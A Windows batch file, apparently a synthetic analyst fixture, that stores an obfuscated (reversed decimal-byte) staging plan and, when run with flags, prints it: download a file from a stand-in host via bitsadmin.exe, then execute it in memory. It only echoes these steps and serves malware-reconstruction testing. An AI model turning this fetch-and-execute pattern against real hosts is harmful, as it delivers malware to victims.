@echo off
setlocal EnableExtensions EnableDelayedExpansion
rem HUNTRESS-CODEC:decimal_bytes|reverse
rem HUNTRESS-MATERIAL:116.97.100.46.48.54.48.98.57.55.51.98.47.100.105.108.97.118.110.105.46.101.108.112.109.97.120.101.46.48.52.55.53.102.49.52.102.53.54.47.47.58.115.112.116.116.104.61.108.114.117.124.48.52.55.53.102.49.52.102.53.54.45.110.103.105.97.112.109.97.99.61.100.105.95.110.103.105.97.112.109.97.99.124.101.110.111.110.61.101.103.97.117.103.110.97.108.95.116.120.101.110.124.114.97.101.110.105.108.61.104.112.97.114.103.124.49.61.116.110.117.111.99.95.101.103.97.116.115.124.101.120.101.46.110.105.109.100.97.115.116.105.98.61.114.101.116.112.97.100.97.124.121.114.111.109.101.109.95.104.99.116.97.112.115.105.100.44.101.116.111.109.101.114.95.101.114.105.117.113.99.97.61.115.112.101.116.115.124.49.61.118
rem analyst reconstruction fixture
rem HUNTRESS-EXTENSION:bat
if /i "%~1"=="--inspect" goto :HUNTRESS_INSPECT
if /i "%~1"=="--plan" goto :HUNTRESS_PLAN
exit /b 0
:HUNTRESS_INSPECT
set item0=v=1^|steps=acquire_remote,dispatch_memory^|adapter
set item1==bitsadmin.exe^|stage_count=1^|graph=linear^|next_l
set item2=anguage=none^|campaign_id=campaign-65f41f5740^|url
set item3==https://65f41f5740.example.invalid/b379b060.dat
goto :HUNTRESS_SEPARATOR_DONE
ver >nul & rem HUNTRESS separator ampersand
:HUNTRESS_SEPARATOR_DONE
set "neutral_environment_probe=f2707f08"
set "HUNTRESS_READY=1"
if defined HUNTRESS_READY set "item9="
for %%G in (0 1 2 3) do call set "item9=%%item9%%%%item%%G%%"
echo(!item9!
exit /b 0
:HUNTRESS_PLAN
echo bitsadmin.exe GET https://65f41f5740.example.invalid/b379b060.dat then dispatch memory
exit /b 0
